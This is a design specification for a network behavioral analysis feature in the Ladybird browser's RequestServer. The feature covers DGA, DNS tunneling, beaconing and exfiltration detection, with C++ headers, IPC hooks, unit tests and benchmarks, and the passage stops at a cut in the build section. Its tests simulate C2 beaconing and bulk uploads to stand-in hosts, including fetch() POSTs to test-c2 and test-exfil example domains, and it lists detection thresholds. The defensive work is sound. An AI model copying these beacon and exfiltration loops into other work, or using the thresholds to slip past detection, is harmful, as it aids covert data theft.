# Milestone 0.4 Phase 6 Technical Specification
## Network Behavioral Analysis

**Version**: 1.0
**Date**: 2025-11-01
**Status**: Design Phase
**Prerequisites**: Phase 1-5 Complete

---

## 1. Overview

### 1.1 Objectives

Phase 6 implements Zeek-style network behavioral analysis for Ladybird's RequestServer to detect:
- **Domain Generation Algorithm (DGA)** domains
- **Command & Control (C2)** communication patterns
- **DNS tunneling** and exfiltration
- **Beaconing behavior** (periodic callbacks)
- **Data exfiltration** (unusual upload volumes)

### 1.2 Design Principles

1. **Non-blocking**: All analysis runs asynchronously to avoid blocking requests
2. **Privacy-preserving**: No packet capture, only metadata analysis
3. **Graceful degradation**: Network failure should never break browsing
4. **Low overhead**: <10ms per request, <5% CPU sustained
5. **Local-only**: No external API calls, all analysis on-device

### 1.3 Architecture Overview

```
RequestServer Process
├── ConnectionFromClient (existing)
│   └── start_request() hook → record traffic event
├── TrafficMonitor (new)
│   ├── Record request metadata
│   ├── Maintain connection patterns
│   └── Calculate traffic scores
├── DNSAnalyzer (new)
│   ├── DGA detection (entropy, n-grams)
│   ├── DNS tunneling detection
│   └── DNS query pattern analysis
└── C2Detector (new)
    ├── Beaconing detection (interval analysis)
    ├── Upload ratio analysis
    └── Known C2 pattern matching
```

---

## 2. Component APIs

### 2.1 TrafficMonitor

**Purpose**: Central component for recording and analyzing network traffic metadata.

**Header**: `Services/RequestServer/TrafficMonitor.h`

```cpp
/*
 * Copyright (c) 2025, Ladybird contributors
 * SPDX-License-Identifier: BSD-2-Clause
 */

#pragma once

#include <AK/ByteString.h>
#include <AK/Error.h>
#include <AK/HashMap.h>
#include <AK/NonnullOwnPtr.h>
#include <AK/String.h>
#include <AK/Time.h>
#include <AK/Vector.h>
#include <LibURL/URL.h>

namespace RequestServer {

// Forward declarations
class DNSAnalyzer;
class C2Detector;

class TrafficMonitor {
public:
    // Traffic event metadata (per request)
    struct TrafficEvent {
        URL::URL url;
        ByteString method;              // GET, POST, etc.
        u64 bytes_sent { 0 };
        u64 bytes_received { 0 };
        UnixDateTime timestamp;
        Duration response_time;
        u16 status_code { 0 };          // HTTP status code
        bool is_tls { false };
        Optional<ByteString> mime_type;
    };

    // Aggregated connection pattern (per domain)
    struct ConnectionPattern {
        String domain;
        Vector<TrafficEvent> events;
        UnixDateTime first_seen;
        UnixDateTime last_seen;
        u64 total_bytes_sent { 0 };
        u64 total_bytes_received { 0 };
        size_t request_count { 0 };

        // Calculated metrics
        Vector<Duration> request_intervals;  // Time between requests
        float mean_interval_seconds { 0.0f };
        float stddev_interval_seconds { 0.0f };
        float upload_ratio { 0.0f };         // bytes_sent / (sent + received)
    };

    // Composite traffic score
    struct TrafficScore {
        float overall_risk { 0.0f };       // 0.0-1.0 (0 = benign, 1 = malicious)
        float confidence { 0.0f };         // Detection confidence (0.0-1.0)

        // Individual scores
        float dga_score { 0.0f };          // DGA domain likelihood
        float beaconing_score { 0.0f };    // Regular interval communication
        float exfiltration_score { 0.0f }; // Large upload volume
        float c2_score { 0.0f };           // C2 pattern matching
        float dns_tunneling_score { 0.0f };

        // Detection details
        bool is_dga_domain { false };
        bool is_beaconing { false };
        bool is_exfiltration { false };
        bool is_c2_pattern { false };
        bool is_dns_tunneling { false };

        // Anomaly indicators
        Vector<String> indicators;         // Human-readable explanations
        String explanation;                // Combined explanation
    };

    // Configuration
    struct Config {
        // Pattern tracking limits
        size_t max_patterns_tracked { 10000 };   // Max domains to track
        size_t max_events_per_pattern { 100 };   // Max events per domain
        Duration pattern_expiry { Duration::from_hours(24) };  // Cleanup old patterns

        // Analysis thresholds
        Duration min_beaconing_interval { Duration::from_seconds(10) };
        Duration max_beaconing_interval { Duration::from_hours(1) };
        float beaconing_cv_threshold { 0.3f };   // Coefficient of variation
        u64 exfiltration_bytes_threshold { 100 * 1024 * 1024 };  // 100 MB
        float exfiltration_ratio_threshold { 0.7f };  // 70% upload ratio

        // Performance limits
        size_t min_events_for_analysis { 5 };    // Minimum events to analyze
        bool async_analysis { true };            // Run analysis in background
    };

    static ErrorOr<NonnullOwnPtr<TrafficMonitor>> create(Config const& config = Config{});
    ~TrafficMonitor() = default;

    // Record a network request
    void record_request(TrafficEvent const& event);

    // Analyze a specific domain
    ErrorOr<TrafficScore> analyze_domain(StringView domain) const;

    // Analyze a connection pattern (for testing)
    ErrorOr<TrafficScore> analyze_pattern(ConnectionPattern const& pattern) const;

    // Get connection pattern for a domain
    Optional<ConnectionPattern> get_pattern(StringView domain) const;

    // Get all tracked domains
    Vector<String> get_tracked_domains() const;

    // Statistics
    struct Statistics {
        size_t total_events_recorded { 0 };
        size_t total_patterns_tracked { 0 };
        size_t total_analyses_performed { 0 };
        size_t threats_detected { 0 };
        float avg_analysis_time_ms { 0.0f };
    };
    Statistics get_statistics() const;
    void reset_statistics();

    // Maintenance
    void cleanup_expired_patterns();
    void reset_patterns();

    // Configuration
    Config const& config() const { return m_config; }
    void set_config(Config const& config);

private:
    TrafficMonitor(Config const& config,
                   NonnullOwnPtr<DNSAnalyzer> dns_analyzer,
                   NonnullOwnPtr<C2Detector> c2_detector);

    // Update connection pattern with new event
    void update_pattern(String const& domain, TrafficEvent const& event);

    // Calculate aggregated metrics for a pattern
    void calculate_pattern_metrics(ConnectionPattern& pattern) const;

    // Combine individual scores into overall risk
    TrafficScore combine_scores(TrafficScore const& score) const;

    Config m_config;
    HashMap<String, ConnectionPattern> m_patterns;
    NonnullOwnPtr<DNSAnalyzer> m_dns_analyzer;
    NonnullOwnPtr<C2Detector> m_c2_detector;
    Statistics m_stats;

    // Scoring weights (must sum to 1.0)
    static constexpr float DGA_WEIGHT = 0.3f;
    static constexpr float BEACONING_WEIGHT = 0.25f;
    static constexpr float EXFILTRATION_WEIGHT = 0.2f;
    static constexpr float C2_WEIGHT = 0.15f;
    static constexpr float DNS_TUNNELING_WEIGHT = 0.1f;
};

}
```

### 2.2 DNSAnalyzer

**Purpose**: Detect Domain Generation Algorithm (DGA) domains and DNS tunneling.

**Header**: `Services/RequestServer/DNSAnalyzer.h`

```cpp
/*
 * Copyright (c) 2025, Ladybird contributors
 * SPDX-License-Identifier: BSD-2-Clause
 */

#pragma once

#include <AK/ByteString.h>
#include <AK/Error.h>
#include <AK/HashMap.h>
#include <AK/NonnullOwnPtr.h>
#include <AK/String.h>
#include <AK/Vector.h>

namespace RequestServer {

class DNSAnalyzer {
public:
    // DNS query metadata
    struct DNSQuery {
        String domain;
        UnixDateTime timestamp;
        bool is_subdomain { false };
        size_t subdomain_depth { 0 };
        size_t total_length { 0 };
    };

    // DGA detection result
    struct DGAScore {
        float score { 0.0f };              // 0.0-1.0 (0 = legitimate, 1 = DGA)
        float confidence { 0.0f };

        // Individual indicators
        float entropy_score { 0.0f };      // Shannon entropy
        float ngram_score { 0.0f };        // N-gram analysis
        float length_score { 0.0f };       // Domain length anomaly
        float vowel_ratio_score { 0.0f };  // Vowel distribution
        float consonant_cluster_score { 0.0f };  // Consonant clusters

        bool high_entropy { false };
        bool unusual_ngrams { false };
        bool excessive_length { false };
        bool abnormal_vowels { false };
        bool consonant_clusters { false };

        String explanation;
    };

    // DNS tunneling detection result
    struct TunnelingScore {
        float score { 0.0f };              // 0.0-1.0
        float confidence { 0.0f };

        bool high_query_rate { false };    // Many queries in short time
        bool excessive_subdomain_depth { false };  // Deep subdomain nesting
        bool long_subdomain_labels { false };      // Long subdomain names
        bool base64_encoded_data { false }; // Base64-like subdomains

        size_t queries_per_minute { 0 };
        size_t max_subdomain_depth { 0 };
        size_t max_label_length { 0 };

        String explanation;
    };

    static ErrorOr<NonnullOwnPtr<DNSAnalyzer>> create();
    ~DNSAnalyzer() = default;

    // DGA detection
    ErrorOr<DGAScore> analyze_dga(StringView domain) const;

    // DNS tunneling detection
    ErrorOr<TunnelingScore> analyze_tunneling(Vector<DNSQuery> const& queries) const;

    // Record a DNS query for tunneling analysis
    void record_query(DNSQuery const& query);

    // Individual detection methods (public for testing)
    static float calculate_shannon_entropy(StringView domain);
    static float calculate_ngram_score(StringView domain);
    static float calculate_vowel_ratio(StringView domain);
    static float calculate_consonant_cluster_ratio(StringView domain);
    static bool is_likely_base64(StringView label);
    static size_t count_subdomain_depth(StringView domain);

    // Statistics
    struct Statistics {
        size_t total_dga_checks { 0 };
        size_t dga_detected { 0 };
        size_t total_tunneling_checks { 0 };
        size_t tunneling_detected { 0 };
        float avg_entropy { 0.0f };
    };
    Statistics get_statistics() const;
    void reset_statistics();

    // Cleanup old queries (for tunneling analysis)
    void cleanup_old_queries(Duration max_age);

private:
    DNSAnalyzer() = default;

    // N-gram analysis using trigrams
    static HashMap<String, float> const& legitimate_trigrams();
    float compare_trigrams(StringView domain) const;

    // Query tracking for tunneling detection
    HashMap<String, Vector<DNSQuery>> m_query_history;
    Statistics m_stats;

    // Detection thresholds
    static constexpr float HIGH_ENTROPY_THRESHOLD = 3.5f;  // Shannon entropy
    static constexpr float VERY_HIGH_ENTROPY_THRESHOLD = 4.0f;
    static constexpr size_t MIN_DGA_LENGTH = 10;
    static constexpr size_t MAX_LEGITIMATE_LENGTH = 40;
    static constexpr float MIN_VOWEL_RATIO = 0.2f;
    static constexpr float MAX_VOWEL_RATIO = 0.6f;
    static constexpr float MAX_CONSONANT_CLUSTER_RATIO = 0.6f;

    // Tunneling thresholds
    static constexpr size_t QUERIES_PER_MINUTE_THRESHOLD = 20;
    static constexpr size_t MAX_SUBDOMAIN_DEPTH_THRESHOLD = 5;
    static constexpr size_t MAX_LABEL_LENGTH_THRESHOLD = 40;
};

}
```

### 2.3 C2Detector

**Purpose**: Detect Command & Control (C2) communication patterns and data exfiltration.

**Header**: `Services/RequestServer/C2Detector.h`

```cpp
/*
 * Copyright (c) 2025, Ladybird contributors
 * SPDX-License-Identifier: BSD-2-Clause
 */

#pragma once

#include <AK/ByteString.h>
#include <AK/Error.h>
#include <AK/HashMap.h>
#include <AK/NonnullOwnPtr.h>
#include <AK/String.h>
#include <AK/Time.h>
#include <AK/Vector.h>

namespace RequestServer {

class C2Detector {
public:
    // C2 pattern matching
    struct C2Pattern {
        String pattern_type;               // "beaconing", "exfiltration", "known_c2"
        Vector<String> indicators;         // Specific indicators matched
        float severity { 0.0f };           // 0.0-1.0
        String description;
    };

    // Beaconing detection result
    struct BeaconingScore {
        float score { 0.0f };              // 0.0-1.0
        float confidence { 0.0f };

        bool regular_intervals { false };
        bool long_lived_connection { false };
        bool small_payload_sizes { false };

        float coefficient_of_variation { 0.0f };  // Interval regularity
        float mean_interval_seconds { 0.0f };
        float stddev_interval_seconds { 0.0f };
        size_t beacon_count { 0 };
        Duration total_duration;

        String explanation;
    };

    // Data exfiltration detection result
    struct ExfiltrationScore {
        float score { 0.0f };              // 0.0-1.0
        float confidence { 0.0f };

        bool high_upload_ratio { false };
        bool large_upload_volume { false };
        bool unusual_destination { false };
        bool non_interactive { false };    // No user input before upload

        float upload_ratio { 0.0f };       // bytes_sent / (sent + received)
        u64 total_bytes_uploaded { 0 };
        size_t upload_requests { 0 };

        String explanation;
    };

    // Known C2 infrastructure result
    struct KnownC2Score {
        float score { 0.0f };              // 0.0-1.0 (1.0 = confirmed C2)
        float confidence { 1.0f };         // Always high confidence if matched

        bool matched_ip_range { false };
        bool matched_domain_pattern { false };
        bool matched_tld { false };
        bool matched_known_malware { false };

        Vector<String> matched_indicators;
        String malware_family;             // If known

        String explanation;
    };

    // Composite C2 score
    struct C2Score {
        float overall_score { 0.0f };      // 0.0-1.0
        float confidence { 0.0f };

        BeaconingScore beaconing;
        ExfiltrationScore exfiltration;
        KnownC2Score known_c2;

        Vector<C2Pattern> patterns_matched;
        String explanation;
    };

    static ErrorOr<NonnullOwnPtr<C2Detector>> create();
    ~C2Detector() = default;

    // Beaconing detection
    ErrorOr<BeaconingScore> detect_beaconing(
        Vector<UnixDateTime> const& timestamps) const;

    // Data exfiltration detection
    ErrorOr<ExfiltrationScore> detect_exfiltration(
        u64 bytes_sent,
        u64 bytes_received,
        size_t request_count,
        bool has_user_interaction) const;

    // Known C2 infrastructure check
    ErrorOr<KnownC2Score> check_known_c2(StringView domain) const;

    // Composite analysis
    ErrorOr<C2Score> analyze(
        StringView domain,
        Vector<UnixDateTime> const& timestamps,
        u64 bytes_sent,
        u64 bytes_received,
        size_t request_count,
        bool has_user_interaction) const;

    // Update known C2 indicators (from threat feeds)
    ErrorOr<void> update_c2_indicators(Vector<String> const& indicators);

    // Statistics
    struct Statistics {
        size_t total_beaconing_checks { 0 };
        size_t beaconing_detected { 0 };
        size_t total_exfiltration_checks { 0 };
        size_t exfiltration_detected { 0 };
        size_t known_c2_matches { 0 };
    };
    Statistics get_statistics() const;
    void reset_statistics();

private:
    C2Detector() = default;

    // Statistical analysis helpers
    static float calculate_mean(Vector<Duration> const& intervals);
    static float calculate_stddev(Vector<Duration> const& intervals, float mean);
    static float calculate_coefficient_of_variation(float stddev, float mean);

    // Known C2 indicators database
    HashMap<String, String> m_known_c2_domains;  // domain -> malware family
    Vector<String> m_suspicious_tlds;            // Free/unverified TLDs

    Statistics m_stats;

    // Detection thresholds
    static constexpr float LOW_CV_THRESHOLD = 0.1f;      // Very regular
    static constexpr float MEDIUM_CV_THRESHOLD = 0.3f;   // Somewhat regular
    static constexpr size_t MIN_BEACONS = 5;
    static constexpr float EXFILTRATION_RATIO_THRESHOLD = 0.7f;  // 70% uploads
    static constexpr u64 LARGE_UPLOAD_THRESHOLD = 100 * 1024 * 1024;  // 100 MB
};

}
```

---

## 3. Data Structures

### 3.1 Core Types

```cpp
// Enums
enum class ThreatType {
    None,
    DGA,
    Beaconing,
    Exfiltration,
    DNSTunneling,
    KnownC2
};

enum class RiskLevel {
    Low,        // 0.0-0.3
    Medium,     // 0.3-0.6
    High,       // 0.6-0.8
    Critical    // 0.8-1.0
};

// Helper functions
static RiskLevel score_to_risk_level(float score) {
    if (score < 0.3f) return RiskLevel::Low;
    if (score < 0.6f) return RiskLevel::Medium;
    if (score < 0.8f) return RiskLevel::High;
    return RiskLevel::Critical;
}

static StringView risk_level_to_string(RiskLevel level) {
    switch (level) {
    case RiskLevel::Low: return "Low"sv;
    case RiskLevel::Medium: return "Medium"sv;
    case RiskLevel::High: return "High"sv;
    case RiskLevel::Critical: return "Critical"sv;
    }
    VERIFY_NOT_REACHED();
}
```

### 3.2 Alert Format

```cpp
// Alert structure for IPC messages
struct TrafficAlert {
    String domain;
    ThreatType threat_type;
    RiskLevel risk_level;
    float score;
    float confidence;
    Vector<String> indicators;
    String explanation;
    UnixDateTime detected_at;

    // Serialize to JSON for IPC
    ErrorOr<String> to_json() const;
    static ErrorOr<TrafficAlert> from_json(StringView json);
};
```

---

## 4. IPC Protocol Specification

### 4.1 RequestServer.ipc Additions

Add the following to `/home/rbsmith4/ladybird/Services/RequestServer/RequestServer.ipc`:

```cpp
// Network behavioral analysis (Phase 6 Milestone 0.4)
enable_traffic_monitoring(u64 page_id, bool enabled) =|
get_traffic_statistics() => (ByteString stats_json)
get_traffic_alerts(u64 page_id) => (Vector<ByteString> alert_json_array)
clear_traffic_alerts(u64 page_id) =|
```

### 4.2 RequestClient.ipc Additions

Create or add to `/home/rbsmith4/ladybird/Services/RequestServer/RequestClient.ipc`:

```cpp
// Network behavioral analysis alerts (Phase 6)
traffic_alert_detected(u64 page_id, ByteString alert_json) =|
```

### 4.3 JSON Message Formats

**Traffic Alert Message**:
```json
{
  "alert_id": "uuid-string",
  "page_id": 12345,
  "domain": "malicious-domain.com",
  "threat_type": "Beaconing",
  "risk_level": "High",
  "score": 0.85,
  "confidence": 0.92,
  "indicators": [
    "Regular intervals detected (CV=0.05)",
    "Mean interval: 30 seconds",
    "19 beacons over 10 minutes"
  ],
  "explanation": "High confidence C2 beaconing detected: regular communication every 30s with low variance",
  "detected_at": "2025-11-01T12:34:56Z",
  "timestamp_unix": 1730467496
}
```

**Traffic Statistics Message**:
```json
{
  "total_events": 12543,
  "patterns_tracked": 342,
  "analyses_performed": 89,
  "threats_detected": 3,
  "avg_analysis_time_ms": 2.4,
  "domains_tracked": ["example.com", "another-site.org", "..."],
  "threat_breakdown": {
    "DGA": 1,
    "Beaconing": 1,
    "Exfiltration": 1,
    "DNSTunneling": 0,
    "KnownC2": 0
  }
}
```

### 4.4 IPC Flow Diagram

```
WebContent Process                RequestServer Process
      |                                   |
      | start_request(url, ...)           |
      |---------------------------------->|
      |                                   | TrafficMonitor::record_request()
      |                                   | (async analysis in background)
      |                                   |
      |                                   | If threat detected:
      |                                   | TrafficScore >= 0.6
      | <-- traffic_alert_detected()      |
      |     (alert JSON)                  |
      |                                   |
      | User shown alert dialog           |
      | (allow/block decision)            |
      |                                   |
      | enforce_security_policy()         |
      |---------------------------------->|
      |                                   | Apply user decision
      |                                   |
```

---

## 5. Integration Points

### 5.1 ConnectionFromClient Integration

**File**: `Services/RequestServer/ConnectionFromClient.{h,cpp}`

**Header Additions**:
```cpp
// In ConnectionFromClient class
private:
    OwnPtr<TrafficMonitor> m_traffic_monitor;
    HashMap<u64, bool> m_traffic_monitoring_enabled;  // page_id -> enabled
    HashMap<u64, Vector<TrafficAlert>> m_pending_alerts;  // page_id -> alerts
```

**Implementation Hook**:
```cpp
// In ConnectionFromClient::start_request()
void ConnectionFromClient::start_request(
    i32 request_id, ByteString method, URL::URL url,
    HTTP::HeaderMap headers, ByteBuffer body,
    Core::ProxyData proxy_data, u64 page_id)
{
    // Existing validation...
    if (!check_rate_limit()) return;
    if (!validate_url(url)) return;

    // NEW: Traffic monitoring hook
    if (m_traffic_monitor && is_traffic_monitoring_enabled(page_id)) {
        TrafficMonitor::TrafficEvent event {
            .url = url,
            .method = method,
            .bytes_sent = body.size(),
            .bytes_received = 0,  // Will be updated on response
            .timestamp = UnixDateTime::now(),
            .is_tls = url.scheme() == "https"sv
        };
        m_traffic_monitor->record_request(event);

        // Async analysis (don't block request)
        Threading::BackgroundAction::create(
            [this, domain = url.serialized_host().value_or({}), page_id]() {
                analyze_traffic_async(domain, page_id);
            });
    }

    // Continue with existing request handling...
    issue_network_request(request_id, method, url, headers, body, proxy_data, page_id);
}

void ConnectionFromClient::analyze_traffic_async(
    String const& domain, u64 page_id)
{
    auto score = m_traffic_monitor->analyze_domain(domain);
    if (score.is_error()) {
        dbgln("TrafficMonitor: Analysis failed: {}", score.error());
        return;
    }

    // Alert on medium-high risk (>= 0.6)
    if (score.value().overall_risk >= 0.6f) {
        TrafficAlert alert {
            .domain = domain,
            .threat_type = determine_threat_type(score.value()),
            .risk_level = score_to_risk_level(score.value().overall_risk),
            .score = score.value().overall_risk,
            .confidence = score.value().confidence,
            .indicators = score.value().indicators,
            .explanation = score.value().explanation,
            .detected_at = UnixDateTime::now()
        };

        // Send IPC alert to WebContent
        auto alert_json = alert.to_json();
        if (!alert_json.is_error()) {
            async_traffic_alert_detected(page_id, alert_json.value());
            store_pending_alert(page_id, move(alert));
        }
    }
}
```

### 5.2 Request Response Hook

Update response handling to record bytes received:

```cpp
// In ConnectionFromClient::on_data_received() callback
size_t ConnectionFromClient::on_data_received(
    void* buffer, size_t size, size_t nmemb, void* user_data)
{
    auto* request = static_cast<Request*>(user_data);
    size_t bytes_received = size * nmemb;

    // Existing response handling...

    // NEW: Update traffic monitor with response size
    if (request->connection_from_client().traffic_monitor()) {
        request->connection_from_client().traffic_monitor()
            ->update_response_size(request->url(), bytes_received);
    }

    return bytes_received;
}
```

### 5.3 Initialization Hook

Initialize TrafficMonitor in ConnectionFromClient constructor:

```cpp
// In ConnectionFromClient::ConnectionFromClient()
ConnectionFromClient::ConnectionFromClient(NonnullOwnPtr<IPC::Transport> transport)
    : IPC::ConnectionFromClient<RequestClientEndpoint, RequestServerEndpoint>(*this, move(transport), 1)
    , m_resolver(MUST(Resolver::create()))
{
    // Existing initialization...

    // NEW: Initialize traffic monitor
    auto traffic_config = TrafficMonitor::Config {
        .max_patterns_tracked = 10000,
        .async_analysis = true
    };
    auto traffic_monitor = TrafficMonitor::create(traffic_config);
    if (traffic_monitor.is_error()) {
        dbgln("Warning: Failed to create TrafficMonitor: {}", traffic_monitor.error());
    } else {
        m_traffic_monitor = traffic_monitor.release_value();
    }
}
```

### 5.4 IPC Handler Implementation

```cpp
// In ConnectionFromClient.cpp

void ConnectionFromClient::enable_traffic_monitoring(u64 page_id, bool enabled)
{
    m_traffic_monitoring_enabled.set(page_id, enabled);
    dbgln("TrafficMonitor: {} for page_id {}", enabled ? "Enabled" : "Disabled", page_id);
}

Messages::RequestServer::GetTrafficStatisticsResponse
ConnectionFromClient::get_traffic_statistics()
{
    if (!m_traffic_monitor)
        return ByteString("{}");

    auto stats = m_traffic_monitor->get_statistics();
    // Build JSON response (see section 4.3 for format)
    StringBuilder json;
    json.append("{\"total_events\":"sv);
    json.appendff("{}", stats.total_events_recorded);
    // ... build complete JSON
    return json.to_byte_string();
}

Messages::RequestServer::GetTrafficAlertsResponse
ConnectionFromClient::get_traffic_alerts(u64 page_id)
{
    Vector<ByteString> alerts_json;

    auto it = m_pending_alerts.find(page_id);
    if (it == m_pending_alerts.end())
        return alerts_json;

    for (auto const& alert : it->value) {
        auto json = alert.to_json();
        if (!json.is_error())
            alerts_json.append(json.value());
    }

    return alerts_json;
}

void ConnectionFromClient::clear_traffic_alerts(u64 page_id)
{
    m_pending_alerts.remove(page_id);
}
```

---

## 6. Test Strategy

### 6.1 Unit Tests

**File**: `Services/RequestServer/TestTrafficMonitor.cpp`

```cpp
TEST_CASE(traffic_monitor_creation)
{
    auto config = TrafficMonitor::Config{};
    auto monitor = MUST(TrafficMonitor::create(config));
    EXPECT_EQ(monitor->get_statistics().total_events_recorded, 0u);
}

TEST_CASE(record_single_request)
{
    auto monitor = MUST(TrafficMonitor::create());
    TrafficMonitor::TrafficEvent event {
        .url = MUST(URL::URL::create("https://example.com"_string)),
        .method = "GET"_string,
        .bytes_sent = 0,
        .bytes_received = 1024,
        .timestamp = UnixDateTime::now()
    };

    monitor->record_request(event);
    EXPECT_EQ(monitor->get_statistics().total_events_recorded, 1u);
}

TEST_CASE(benign_traffic_low_score)
{
    auto monitor = MUST(TrafficMonitor::create());

    // Simulate normal browsing
    for (size_t i = 0; i < 10; i++) {
        TrafficMonitor::TrafficEvent event {
            .url = MUST(URL::URL::create("https://example.com"_string)),
            .method = "GET"_string,
            .bytes_sent = 100,
            .bytes_received = 10000,
            .timestamp = UnixDateTime::now()
        };
        monitor->record_request(event);
    }

    auto score = MUST(monitor->analyze_domain("example.com"sv));
    EXPECT_LT(score.overall_risk, 0.3f);  // Should be low risk
}

TEST_CASE(beaconing_detection)
{
    auto monitor = MUST(TrafficMonitor::create());

    // Simulate regular beaconing (every 30 seconds)
    auto base_time = UnixDateTime::now();
    for (size_t i = 0; i < 10; i++) {
        TrafficMonitor::TrafficEvent event {
            .url = MUST(URL::URL::create("https://c2-server.com"_string)),
            .method = "POST"_string,
            .bytes_sent = 50,
            .bytes_received = 50,
            .timestamp = UnixDateTime::from_seconds_since_epoch(
                base_time.seconds_since_epoch() + i * 30)
        };
        monitor->record_request(event);
    }

    auto score = MUST(monitor->analyze_domain("c2-server.com"sv));
    EXPECT_GT(score.beaconing_score, 0.7f);  // High beaconing score
    EXPECT(score.is_beaconing);
}

TEST_CASE(exfiltration_detection)
{
    auto monitor = MUST(TrafficMonitor::create());

    // Simulate data exfiltration (large uploads)
    for (size_t i = 0; i < 5; i++) {
        TrafficMonitor::TrafficEvent event {
            .url = MUST(URL::URL::create("https://exfil-server.com"_string)),
            .method = "POST"_string,
            .bytes_sent = 50 * 1024 * 1024,  // 50 MB upload
            .bytes_received = 100,            // Small response
            .timestamp = UnixDateTime::now()
        };
        monitor->record_request(event);
    }

    auto score = MUST(monitor->analyze_domain("exfil-server.com"sv));
    EXPECT_GT(score.exfiltration_score, 0.7f);
    EXPECT(score.is_exfiltration);
}
```

**File**: `Services/RequestServer/TestDNSAnalyzer.cpp`

```cpp
TEST_CASE(dga_detection_legitimate_domain)
{
    auto analyzer = MUST(DNSAnalyzer::create());
    auto score = MUST(analyzer->analyze_dga("google.com"sv));
    EXPECT_LT(score.score, 0.3f);  // Low DGA score
}

TEST_CASE(dga_detection_random_domain)
{
    auto analyzer = MUST(DNSAnalyzer::create());
    // DGA-like domain: high entropy, unusual n-grams
    auto score = MUST(analyzer->analyze_dga("xkvjmzqhwbprtfygdn.com"sv));
    EXPECT_GT(score.score, 0.7f);  // High DGA score
    EXPECT(score.high_entropy);
}

TEST_CASE(shannon_entropy_calculation)
{
    // Test entropy calculation
    EXPECT_LT(DNSAnalyzer::calculate_shannon_entropy("google"sv), 3.0f);
    EXPECT_GT(DNSAnalyzer::calculate_shannon_entropy("xkvjmzqhwb"sv), 3.5f);
}

TEST_CASE(dns_tunneling_detection)
{
    auto analyzer = MUST(DNSAnalyzer::create());

    // Simulate DNS tunneling: many queries with long subdomains
    Vector<DNSAnalyzer::DNSQuery> queries;
    for (size_t i = 0; i < 30; i++) {
        queries.append({
            .domain = String::formatted("data{}.tunnel.example.com", i),
            .timestamp = UnixDateTime::now(),
            .is_subdomain = true,
            .subdomain_depth = 3,
            .total_length = 40
        });
    }

    auto score = MUST(analyzer->analyze_tunneling(queries));
    EXPECT_GT(score.score, 0.6f);
    EXPECT(score.high_query_rate);
}
```

**File**: `Services/RequestServer/TestC2Detector.cpp`

```cpp
TEST_CASE(beaconing_regular_intervals)
{
    auto detector = MUST(C2Detector::create());

    // Regular intervals (30 seconds)
    Vector<UnixDateTime> timestamps;
    auto base = UnixDateTime::now();
    for (size_t i = 0; i < 10; i++) {
        timestamps.append(UnixDateTime::from_seconds_since_epoch(
            base.seconds_since_epoch() + i * 30));
    }

    auto score = MUST(detector->detect_beaconing(timestamps));
    EXPECT_LT(score.coefficient_of_variation, 0.1f);  // Very regular
    EXPECT(score.regular_intervals);
}

TEST_CASE(exfiltration_high_upload_ratio)
{
    auto detector = MUST(C2Detector::create());

    auto score = MUST(detector->detect_exfiltration(
        100 * 1024 * 1024,  // 100 MB sent
        1024,               // 1 KB received
        10,                 // 10 requests
        false               // No user interaction
    ));

    EXPECT_GT(score.upload_ratio, 0.9f);
    EXPECT(score.high_upload_ratio);
    EXPECT(score.large_upload_volume);
}
```

### 6.2 Integration Tests

**File**: `Tests/LibWeb/Text/input/network-behavioral-analysis.html`

```html
<!DOCTYPE html>
<html>
<head>
    <title>Network Behavioral Analysis Test</title>
</head>
<body>
    <script>
        // Test beaconing detection
        function testBeaconing() {
            let count = 0;
            const interval = setInterval(async () => {
                await fetch('https://test-c2.example.com/beacon', {
                    method: 'POST',
                    body: 'ping'
                });
                count++;
                if (count >= 10) {
                    clearInterval(interval);
                    println("Beaconing test complete");
                }
            }, 5000);  // Every 5 seconds
        }

        // Test exfiltration detection
        async function testExfiltration() {
            const largeData = 'X'.repeat(10 * 1024 * 1024);  // 10 MB
            for (let i = 0; i < 5; i++) {
                await fetch('https://test-exfil.example.com/upload', {
                    method: 'POST',
                    body: largeData
                });
            }
            println("Exfiltration test complete");
        }

        // Run tests
        println("Starting network behavioral analysis tests");
        // Note: Actual test would mock RequestServer responses
    </script>
</body>
</html>
```

### 6.3 Performance Benchmarks

**File**: `Services/RequestServer/BenchmarkTrafficMonitor.cpp`

```cpp
BENCHMARK_CASE(record_1000_events)
{
    auto monitor = MUST(TrafficMonitor::create());

    for (size_t i = 0; i < 1000; i++) {
        TrafficMonitor::TrafficEvent event {
            .url = MUST(URL::URL::create("https://example.com"_string)),
            .method = "GET"_string,
            .bytes_sent = 100,
            .bytes_received = 1000,
            .timestamp = UnixDateTime::now()
        };
        monitor->record_request(event);
    }
}

BENCHMARK_CASE(analyze_100_domains)
{
    auto monitor = MUST(TrafficMonitor::create());

    // Pre-populate with data
    for (size_t i = 0; i < 1000; i++) {
        auto domain = String::formatted("domain{}.com", i % 100);
        TrafficMonitor::TrafficEvent event {
            .url = MUST(URL::URL::create(String::formatted("https://{}", domain))),
            .method = "GET"_string,
            .bytes_sent = 100,
            .bytes_received = 1000,
            .timestamp = UnixDateTime::now()
        };
        monitor->record_request(event);
    }

    // Benchmark analysis
    for (size_t i = 0; i < 100; i++) {
        auto domain = String::formatted("domain{}.com", i);
        (void)monitor->analyze_domain(domain);
    }
}
```

### 6.4 Success Criteria

- [ ] All unit tests pass (>20 test cases across 3 components)
- [ ] DGA detection: >90% accuracy on known DGA datasets
- [ ] Beaconing detection: >85% accuracy with <10% false positives
- [ ] Exfiltration detection: >80% accuracy on simulated attacks
- [ ] Performance: <10ms per request analysis (99th percentile)
- [ ] Memory: <50 MB overhead with 10,000 tracked domains
- [ ] CPU: <5% sustained CPU usage during analysis
- [ ] Zero crashes or hangs during 24-hour stress test

---

## 7. Implementation Plan

### 7.1 File Structure

Create the following files:

```
Services/RequestServer/
├── TrafficMonitor.h            # Main traffic monitoring component
├── TrafficMonitor.cpp          # Implementation
├── DNSAnalyzer.h               # DGA and DNS tunneling detection
├── DNSAnalyzer.cpp             # Implementation
├── C2Detector.h                # C2 and beaconing detection
├── C2Detector.cpp              # Implementation
├── TestTrafficMonitor.cpp      # Unit tests for TrafficMonitor
├── TestDNSAnalyzer.cpp         # Unit tests for DNSAnalyzer
├── TestC2Detector.cpp          # Unit tests for C2Detector
└── BenchmarkTrafficMonitor.cpp # Performance benchmarks

Services/RequestServer/RequestServer.ipc
└── (Add IPC methods as specified in section 4.1)

Services/RequestServer/RequestClient.ipc
└── (Add IPC methods as specified in section 4.2)

Services/RequestServer/ConnectionFromClient.h
Services/RequestServer/ConnectionFromClient.cpp
└── (Add integration hooks as specified in section 5)

Tests/LibWeb/Text/input/
└── network-behavioral-analysis.html  # Integration test
```

### 7.2 Build System Changes

**File**: `Services/RequestServer/CMakeLists.txt`

Add new source files:
